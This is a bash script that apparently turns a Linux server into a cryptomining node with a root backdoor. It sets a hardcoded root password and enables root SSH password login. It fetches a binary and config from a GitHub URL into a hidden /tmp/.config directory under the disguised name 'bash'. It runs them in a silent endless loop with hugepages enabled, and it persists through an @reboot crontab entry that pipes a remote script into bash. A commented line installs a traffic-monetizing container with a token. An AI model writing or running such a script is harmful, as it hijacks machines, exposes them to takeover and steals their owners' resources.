#!/bin/bash
echo root:Bbq.123456 |sudo chpasswd root
sudo sed -i 's/^#\?Port.*/Port 22/g' /etc/ssh/sshd_config;
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
sudo systemctl restart sshd
sudo systemctl restart ssh
###curl -fsSL https://get.docker.com | bash && docker run -d --restart=always --name tm traffmonetizer/cli_v2 start accept --token 1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA=



mode="${1:-0}"
src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"

# Debian12+
sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1

########cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"
name="c${cores}_${addr}"

sudo sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1
sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1

mkdir -p "/tmp/.config"
wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
chmod -R 777 "/tmp/.config"

if [ "$mode" == "0" ]; then
  bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
else
  while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done
fi
